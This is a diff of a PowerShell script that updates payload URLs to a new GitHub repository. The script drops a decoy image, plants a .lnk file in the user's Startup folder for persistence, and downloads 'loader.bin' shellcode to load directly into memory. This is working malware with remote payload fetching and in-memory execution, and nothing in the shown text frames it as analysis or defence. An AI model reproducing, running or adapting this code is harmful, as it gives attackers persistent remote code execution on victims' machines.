@@ -104,13 +104,13 @@ $imageUrl = "https://img.freepik.com/free-photo/abstract-surface-textures-white-
 $imagePath = "$env:TEMP\blue-bird.jpg"
 Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
 
-$luri = "https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/no-image.lnk"
+$luri = "https://raw.githubusercontent.com/hwkewoi391230130/helloworld/refs/heads/master/no-image.lnk"
 $sf = [System.Environment]::GetFolderPath('Startup')
 $lnp = "$sf\secret-image.lnk"
 Invoke-WebRequest -Uri $luri -OutFile $lnp
 
 # Download and load shellcode directly into memory
-$shellcodeUrl = "https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/loader.bin"
+$shellcodeUrl = "https://raw.githubusercontent.com/hwkewoi391230130/helloworld/refs/heads/master/loader.bin"
 $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing).Content
 
 # Allocate memory for the shellcode
